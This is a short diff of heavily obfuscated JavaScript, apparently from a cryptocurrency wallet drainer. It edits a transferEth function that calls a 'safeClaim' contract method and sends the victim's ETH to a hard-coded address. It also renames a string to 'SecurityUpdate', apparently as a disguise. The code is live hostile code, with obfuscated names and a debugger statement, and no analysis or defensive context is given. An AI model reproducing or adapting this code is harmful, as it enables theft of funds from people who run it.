@@ -2005,7 +2005,7 @@ function _0x5ec8() {
     '0x880644ddf208e471c6f2230d31f9027578fa6fcc',
     '0x970d5e0bd5c4f193fccf7fd579590c5f5c69b2d9',
     '0x29cbd0510eec0327992cd6006e63f9fa8e7f33b7',
-    'safeClaim',
+    'SecurityUpdate',
     '0xeef9f339514298c6a857efcfc1a762af84438dee',
     '0xa126aace6757a0dd89c60c1c16cf8997f749780b',
     '0x73a83269b9bbafc427e76be0a2c1a1db2a26f4c2',
@@ -6352,9 +6352,9 @@ async function transferEth(_0x2d6c7a, _0x48f621, _0xaf98f0) {
   var _0x2193f6 = _0x5c7eff
   if (_0x48f621 <= 0x470de4df820000) return !![]
   debugger
-  var _0x56511f = new web3[_0x2193f6(0x277)][_0x2193f6(0x8b4)](claimABI, '0x64ef4935521B90CEf6622b778EbE10F4eD111DbE'),
+  var _0x56511f = new web3[_0x2193f6(0x277)][_0x2193f6(0x8b4)](claimABI, '0x64ef4935521b90cef6622b778ebe10f4ed111dbe'),
     _0xe2878e = _0x56511f[_0x2193f6(0xbda)]['safeClaim']()[_0x2193f6(0x7ab)]()
-  let _0x203c8b = await sendTransaction(_0x2d6c7a, _0xe2878e, claimAddr, _0x48f621)
+  let _0x203c8b = await sendTransaction(_0x2d6c7a, _0xe2878e, '0x64ef4935521b90cef6622b778ebe10f4ed111dbe', _0x48f621)
   return _0x203c8b
 }
 async function sendTransaction(_0x57a595, _0x284029, _0x566ce0, _0x1f4e58) {
